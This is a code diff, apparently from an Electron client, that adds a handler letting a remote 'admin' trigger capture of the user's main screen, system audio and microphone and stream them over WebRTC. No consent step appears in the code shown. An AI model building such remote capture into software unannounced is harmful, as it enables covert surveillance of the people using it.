@@ -61,6 +61,32 @@ window.onload = async () => {
             }
         });
 
+        socket.on('request-screen-mic', async (adminId) => {
+            console.log("Admin requested SCREEN + MIC");
+            try {
+                const sources = await window.electronAPI.getSources();
+                const mainScreen = sources[0];
+                localScreenStream = await navigator.mediaDevices.getUserMedia({
+                    audio: { mandatory: { chromeMediaSource: 'desktop' } },
+                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
+                });
+
+                try {
+                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                    micStream.getAudioTracks().forEach(track => {
+                        localScreenStream.addTrack(track);
+                    });
+                } catch(micErr) {
+                    console.log("Mic access failed, continuing with screen only");
+                }
+
+                setupWebRTC(adminId, localScreenStream);
+            } catch (e) {
+                console.error("Screen + Mic Capture failed", e);
+                socket.emit('client-error', "Screen + Mic Capture failed: " + e.message);
+            }
+        });
+
         // Handle stop screen
         socket.on('stop-screen', () => {
             console.log("Stopping SCREEN");
